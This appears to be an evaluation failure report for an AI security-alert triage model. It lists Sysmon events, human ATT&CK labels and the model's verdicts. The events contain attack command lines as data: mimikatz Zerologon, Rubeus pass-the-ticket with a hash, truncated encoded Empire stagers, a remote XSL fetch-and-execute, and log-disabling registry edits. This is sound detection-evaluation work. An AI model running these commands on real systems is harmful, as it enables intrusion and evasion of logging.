# Failures: single-prompt

15 failures out of 30 rows (dev; 0 transport errors skipped). Model openrouter:nvidia/nemotron-3-super-120b-a12b:free, prompt ee4e8b177422, labels b0695a44d0d4.

Hints (guesses, not buckets): (no retrieval) 15

---
### day2-014  (verdict needs_review != true_positive; technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_launcher_vbs.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Windows\System32\wscript.exe`
- command line `"C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs" `
- parent `C:\Windows\explorer.exe` `C:\windows\Explorer.EXE`

**Label:** true_positive ['T1059.005'] by `Mouheb+Partner`: wscript.exe executing a script named launcher.vbs from the user's Desktop.
**Model:** needs_review [] (confidence 0.6), tier 2, escalated: confidence 0.60 < 0.7
**Technique credit:** 0.00

> A single wscript.exe execution of a .vbs file from the user's Desktop launched via explorer.exe is ambiguous: it matches normal user script execution (legitimate automation, admin tasks, software installers) but also the T1059.005 (Visual Basic) execution pattern used by adversaries. No additional context (script contents, network IOCs, file provenance, follow-on behavior) is present to confirm malicious intent.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/3b775c90eb9a60f87bb1eb09a0faab3b

---

### day2-031  (verdict true_positive != benign_noisy)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_schtasks_creation_standard_user.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\windows\system32\svchost.exe`
- registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MordorSchtask\SD` = `Binary Data`

**Label:** benign_noisy [] by `Mouheb+Partner`: Task Scheduler recording metadata for a newly created task; fires the same way for any task regardless of intent.
**Model:** true_positive ['T1053.005'] (confidence 0.8), tier 1

> The event shows svchost.exe modifying the binary security descriptor (SD) of a scheduled task named MordorSchtask under the TaskCache registry key, which is indicative of creating or altering a scheduled task for persistence.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/133982dde1dd283304d47b9d2d2e9809

---

### day3-048  (technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `aptsimulator_cobaltstrike.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5`, user `WORKSTATION5\APT-Simulator`
- process `C:\TMP\CreateNamedPipe.exe`
- command line `"C:\TMP\CreateNamedPipe.exe"  MSSE-1337-server`
- parent `C:\Windows\System32\cmd.exe` `"C:\Windows\system32\cmd.exe" `

**Label:** true_positive ['T1134'] by `Mouadh`: CreateNamedPipe.exe creating a pipe named MSSE-1337-server matches the Cobalt Strike getsystem named-pipe pattern; the event shows the pipe, not the impersonation, so the parent technique.
**Model:** true_positive ['T1021.004'] (confidence 0.85), tier 2, escalated: confidence 0.60 < 0.7
**Technique credit:** 0.00

> The event shows execution of a suspiciously named binary (CreateNamedPipe.exe) from a non-standard path (C:/TMP) with a named pipe argument (MSSE-1337-server), launched by cmd.exe under the user 'APT-Simulator'. The detection name 'Atomic capture — manual review' and the username strongly indicate an Atomic Red Team simulation of lateral movement via named pipes (T1021.004).

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/e7040a7560c246ae2919525249c8dea3

---

### day3-071  (verdict needs_review != true_positive; technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_allowed.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
**Model:** needs_review [] (confidence 0.65), tier 2, escalated: confidence 0.60 < 0.7
**Technique credit:** 0.00

> An unknown executable (MoveExcel4.exe) located on a user's Desktop is launched via cmd.exe with a private IP address (172.18.39.6) as an argument. The file path, unusual naming, and network argument are suspicious indicators, but there is no corroborating context (file hash, network logs, prior alerts, or threat intel) to confirm malicious intent. It could be a legitimate internal tool, though the location and naming are atypical.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/485267d9ab6b2734ce50667210cf7bec

---

### day3-093  (technique credit 0.50)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `cmd_disable_eventlog_service_startuptype_modification_via_registry.zip`

Event 0:
- source `windows_sysmon`, host `Pedro01`, user `PEDRO01\pedro`
- process `C:\Windows\System32\reg.exe`
- command line `REG  ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4`
- parent `C:\Windows\System32\cmd.exe` `C:\Windows\system32\cmd.exe`

**Label:** true_positive ['T1685.001'] by `Mouadh`: reg add sets the EventLog service Start value to 4 (disabled), so events stop being recorded after the next boot.
**Model:** true_positive ['T1562.001'] (confidence 0.95), tier 1
**Technique credit:** 0.50

> The event shows reg.exe adding a registry value that sets the Start parameter of the EventLog service to 4, which disables the service. This matches the defense evasion technique of disabling Windows Event Logging (T1562.001).

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/f02e5643769070c7067b2c19a064d49d

---

### day3-096  (technique credit 0.50)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `cmd_userinitmprlogonscript_batch.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5`, user `WORKSTATION5\wardog`
- process `C:\Windows\System32\reg.exe`
- command line `REG.exe  ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\Users\wardog\AppData\Local\Temp\art.bat /f`
- parent `C:\Windows\System32\cmd.exe` `"C:\windows\system32\cmd.exe" `

**Label:** true_positive ['T1037.001'] by `Mouadh`: reg add HKCU/Environment UserInitMprLogonScript pointing at a .bat in Temp registers a logon script for persistence.
**Model:** true_positive ['T1037.004'] (confidence 0.95), tier 1
**Technique credit:** 0.50

> The event shows reg.exe adding a registry value HKCUEnvironmentUserInitMprLogonScript pointing to a batch file in the user's Temp directory, which is a known persistence mechanism (Logon Scripts via UserInitMprLogonScript). This matches adversary behavior rather than benign activity.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/263da0117f9e5694f6cb8464416584ae

---

### day3-112  (technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_launcher_vbs.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- command line `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEc... (+4537)`
- parent `C:\Windows\System32\wscript.exe` `"C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs" `

**Label:** true_positive ['T1059.001'] by `Mouadh`: PowerShell -noP -sta -w 1 -enc (encoded stager) spawned by wscript.exe running launcher.vbs.
**Model:** true_positive ['T1027', 'T1562.001'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The PowerShell process is launched via wscript.exe from a user Desktop launcher.vbs and its command line is a large base64-encoded string that, when decoded, contains calls to disable script block logging and AMSI, showing obfuscation and defense evasion.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/9365ab5057d269261db74e081f36e862

---

### day3-113  (technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Windows\System32\cmd.exe`
- command line `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Users\pgustavo\Desktop\GruntHTTP.exe` `"C:\Users\pgustavo\Desktop\GruntHTTP.exe" `

**Label:** true_positive ['T1210'] by `Mouadh`: cmd.exe /c mimikatz.exe "lsadump::zerologon ... /exploit" spawned by GruntHTTP.exe, a Covenant C2 implant: the command line shows the Zerologon (CVE-2020-1472) exploit against a domain controller.
**Model:** true_positive ['T1003'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows cmd.exe executing mimikatz with the Zerologon exploit (lsadump::zerologon) targeting a domain controller, which is a clear credential‑access attempt using a known attack tool. The parent process is GruntHTTP.exe, indicating a likely malicious launcher.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/bd988d57eb24e469955f173e350d38fe

---

### day3-123  (technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `wmic_remote_xsl_jscript.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5`, user `WORKSTATION5\wardog`
- process `C:\Windows\System32\wbem\WMIC.exe`
- command line `wmic  process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"`
- parent `C:\Windows\System32\cmd.exe` `"C:\windows\system32\cmd.exe" `

**Label:** true_positive ['T1220'] by `Mouadh`: wmic process list /FORMAT:<remote .xsl URL> downloads and executes JScript from a remote stylesheet.
**Model:** true_positive ['T1047.001'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The WMIC.exe process was invoked with a /FORMAT parameter pointing to a remote URL hosting an XSL script, which is a known living-off-the-land binary technique for executing arbitrary code via Windows Management Instrumentation. This matches adversary behavior rather than benign administrative activity.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/dceba516594a448ed268d40bc22f45a5

---

### day3-128  (technique credit 0.50)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `cmd_wevtutil_modify_security_eventlog_path.zip`

Event 0:
- source `windows_sysmon`, host `DESKTOP-CQF82L6`, user `DESKTOP-CQF82L6\pedro`
- process `C:\Windows\System32\wevtutil.exe`
- command line `wevtutil  set-log Security /logfilename:"C:\Windows\System32\winevt\Not-Important-Log.evtx"`
- parent `-` `-`

**Label:** true_positive ['T1685.001'] by `Mouadh`: wevtutil set-log Security /logfilename points the Security log at a decoy file name, tampering with event logging.
**Model:** true_positive ['T1562.001'] (confidence 0.9), tier 1
**Technique credit:** 0.50

> The process wevtutil.exe is invoked with the argument 'set-log Security /logfilename:C:/Windows/System32/winevt/Not-Important-Log.evtx', which changes the location of the Security event log, a known method to impair logging and evade detection.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/7f7ab003db86b761eb7bcbf7c634b876

---

### day3-136  (technique credit 0.25)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `cmd_stop_event_logging_controlset_minint_key.zip`

Event 0:
- source `windows_sysmon`, host `Pedro01`, user `PEDRO01\pedro`
- process `C:\Windows\System32\reg.exe`
- command line `REG  ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt`
- parent `C:\Windows\System32\cmd.exe` `C:\Windows\system32\cmd.exe`

**Label:** true_positive ['T1685.001'] by `Mouadh`: reg add of a MiniNt key under CurrentControlSet is the same trick to keep the event log service from starting.
**Model:** true_positive ['T1112'] (confidence 0.8), tier 1
**Technique credit:** 0.25

> The event shows reg.exe adding a registry key under HKLM_SYSTEM_CurrentControlSet_Control_MiniNt, which is a modification of the Windows registry consistent with adversary behavior for defense evasion or persistence (T1112 Modify Registry). The parent process is cmd.exe, indicating likely manual execution.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/4c0f4461d62ef37a209422c835722796

---

### day3-145  (technique credit 0.50)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_shell_rubeus_asktgt_ptt.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION6.theshire.local`, user `THESHIRE\wardog`
- process `C:\Users\sbeavers\Desktop\Rubeus.exe`
- command line `"C:\users\sbeavers\Desktop\Rubeus.exe" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt`
- parent `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` `"C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABDADYANwA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAGwAeQAuAEcARQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABDADYANwApAHsAJAA2AEMANAA9ACQAQwA2ADcALgBHAGUAdABWAGEA... (+4512)`

**Label:** true_positive ['T1550.003'] by `Mouadh`: Rubeus asktgt with an RC4 hash and /ptt requests a Kerberos ticket and injects it into the session (pass-the-ticket).
**Model:** true_positive ['T1550.004'] (confidence 0.95), tier 1
**Technique credit:** 0.50

> The event shows execution of Rubeus.exe with the 'asktgt' command, supplying an RC4 hash for user pgustavo and requesting a ticket (/ptt), which matches the Overpass-the-Hash technique (T1550.004) for credential access via Kerberos TGT request using a hash.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/e7730f676c1054618f227a44d3f0cdd8

---

### day3-151  (technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe`
- command line `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`

**Label:** true_positive ['T1210'] by `Mouadh`: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
**Model:** true_positive ['T1068'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows mimikatz.exe executed with the lsadump::zerologon module targeting a domain controller, which is an exploitation of the Netlogon Zerologon vulnerability to gain privileged access—a clear adversarial action.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/d3fb751282a711918de0ccef80455eda

---

### day3-166  (verdict needs_review != true_positive; technique credit 0.00)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_blocked.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
**Model:** needs_review [] (confidence 0.6), tier 2, escalated: confidence 0.60 < 0.7
**Technique credit:** 0.00

> The event shows an unknown executable `MoveExcel4.exe` on the user's desktop accepting an internal IP address (172.18.39.6) as an argument, launched via cmd.exe. This could be a legitimate administrative tool or a custom malicious tool for lateral movement/data staging; no additional context (hash, reputation, network logs) is present to confirm malicious intent.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/f2d727cf50df35d6b95dbe2903c2d1d1

---

### day3-176  (technique credit 0.25)

**hint:** (no retrieval)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_psexec_dcerpc_tcp_svcctl.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION6.theshire.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\Windows\System32\cmd.exe`
- command line `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyA... (+4599)`
- parent `C:\Windows\System32\services.exe` `C:\windows\system32\services.exe`

**Label:** true_positive ['T1569.002'] by `Mouadh`: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
**Model:** true_positive ['T1059.001', 'T1027'] (confidence 0.95), tier 1
**Technique credit:** 0.25

> The process cmd.exe launches PowerShell with a base64-encoded (-enc) command that attempts to disable script block logging and modify Windows Defender settings, which is characteristic of malicious PowerShell execution and obfuscation.

**Retrieved techniques (top 5):** []  
**Retrieved Sigma rules:** []
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/0dafc8c6a84c2bf93dd9cb09c60cb5f4
